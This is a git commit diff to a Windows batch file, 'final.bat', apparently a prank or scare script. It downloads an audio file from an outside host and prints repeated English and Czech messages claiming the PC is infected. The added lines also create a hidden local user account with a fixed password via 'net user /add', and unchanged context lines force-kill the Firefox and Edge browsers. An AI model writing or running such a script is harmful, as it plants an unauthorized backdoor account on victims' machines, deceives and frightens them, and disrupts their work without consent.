492a922fd179ee02f0c8794787c0c8359f56927b
tobiasrepracek <80835891+tobiasrepracek@users.noreply.github.com>
2022-12-07 18:48:38 +0100

    Update final.bat

--- final.bat
+++ final.bat
@@ -1,6 +1,34 @@
 @echo off
 curl -s https://sources.tobir.xyz/notif.mp3 > notif.mp3
-#start notif.mp3
+net user /add acc 123456!
+echo This pc is beeing infected!
+echo Tento pocitac je zavirovan!
+echo This pc is beeing infected!
+echo Tento pocitac je zavirovan!
+echo This pc is beeing infected!
+echo Tento pocitac je zavirovan!
+echo This pc is beeing infected!
+echo Tento pocitac je zavirovan!
+echo This pc is beeing infected!
+echo Tento pocitac je zavirovan!
+echo This pc is beeing infected!
+echo Tento pocitac je zavirovan!v
+echo This pc is beeing infected!
+echo Tento pocitac je zavirovan!
+echo This pc is beeing infected!
+echo Tento pocitac je zavirovan!
+echo This pc is beeing infected!
+echo Tento pocitac je zavirovan!
+echo This pc is beeing infected!
+echo Tento pocitac je zavirovan!
+echo This pc is beeing infected!
+echo Tento pocitac je zavirovan!
+echo This pc is beeing infected!
+echo Tento pocitac je zavirovan!
+echo This pc is beeing infected!
+echo Tento pocitac je zavirovan!
+echo This pc is beeing infected!
+echo Tento pocitac je zavirovan!
 timeout 8
 taskkill /f /im firefox.exe /t
 taskkill /f /im msedge.exe /t
